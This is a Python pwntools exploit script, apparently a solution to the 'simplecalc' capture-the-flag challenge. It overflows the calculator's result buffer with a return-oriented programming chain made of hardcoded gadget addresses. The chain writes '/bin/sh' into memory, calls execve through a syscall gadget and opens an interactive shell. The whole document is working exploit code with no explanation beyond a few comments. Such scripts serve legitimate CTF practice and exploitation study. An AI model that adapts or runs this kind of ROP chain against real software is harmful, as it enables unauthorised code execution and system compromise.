'''
Author: Samrito
Date: 2021-12-23 08:05:48
LastEditors: Samrito
LastEditTime: 2021-12-23 09:44:43
'''
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

io = process(argv=['./simplecalc'])

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

def addSingle(z):
    io.recvuntil(b'=> ')
    io.sendline(b'1')
    io.recvuntil(b'Integer x: ')
    io.sendline(b'100')
    io.recvuntil(b'Integer y: ')
    io.sendline(str(z-100))

def addQWORD(z):
    addSingle(z& 0xffffffff)
    addSingle((z&0xffffffff00000000)>>32)
    #sleep(1)

pop_rdi_ret = 0x401b73
str_gadage  = 0x044526e # mov qword ptr [rax], rdx; pop rbx; ret;
pop_rax_ret = 0x044db34
pop_rdx_ret = 0x437a85
pop_rsi_ret = 0x401c87
str_addr = 0x6c1000 #rw-p, use to write /bin/sh
syscall_addr = 0x400488

io.recvuntil(b'Expected number of calculations: ')
io.sendline('50')

for i in range(9):
    addQWORD(0)

debug('b * 0x00401529')
addQWORD(pop_rax_ret)
addQWORD(str_addr)
addQWORD(pop_rdx_ret)
addQWORD(0x0068732f6e69622f)
addQWORD(str_gadage)
addQWORD(pop_rax_ret)
addQWORD(0x3b)
addQWORD(pop_rdi_ret)
addQWORD(str_addr)
addQWORD(pop_rsi_ret)
addQWORD(0)
addQWORD(pop_rdx_ret)
addQWORD(0)
addQWORD(syscall_addr)
io.recvuntil(b'=> ')
io.sendline(b'5')
io.interactive()
